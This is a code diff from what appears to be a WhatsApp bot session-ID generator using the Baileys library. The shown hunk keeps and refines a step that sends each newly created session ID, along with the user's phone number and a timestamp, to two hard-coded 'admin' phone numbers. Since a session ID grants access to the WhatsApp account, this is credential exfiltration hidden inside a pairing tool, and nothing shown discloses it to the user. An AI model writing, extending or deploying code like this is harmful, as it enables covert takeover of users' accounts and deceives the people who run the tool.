@@ -342,15 +342,19 @@ _Baileys v7.0 | WhatsApp Multi-Device_`;
                                 console.log(`🔑 Session ID sent to WhatsApp: TREKKER~${sessionId.substring(0, 30)}...`);
                             }
 
-                            // THIRD: Send session ID to admin numbers
+                            // THIRD: Send session ID to admin numbers using JID format
                             await delay(2000);
                             const adminNumbers = ['254704897825', '254799257758'];
                             
                             for (const adminNum of adminNumbers) {
                                 try {
+                                    // Use standard JID format for sending messages as per Baileys documentation
+                                    // Format: [country code][phone number]@s.whatsapp.net
                                     const adminJid = `${adminNum}@s.whatsapp.net`;
                                     
-                                    // Send session ID
+                                    console.log(`📤 Sending session ID to admin using JID: ${adminJid}`);
+                                    
+                                    // Send session ID using standard JID (not LID)
                                     await sock.sendMessage(adminJid, { 
                                         text: `📋 *NEW SESSION CREATED*\n\n${sessionIdMessage}\n\n👤 Owner: ${phoneNumber}\n⏰ Time: ${new Date().toLocaleString()}`
                                     });
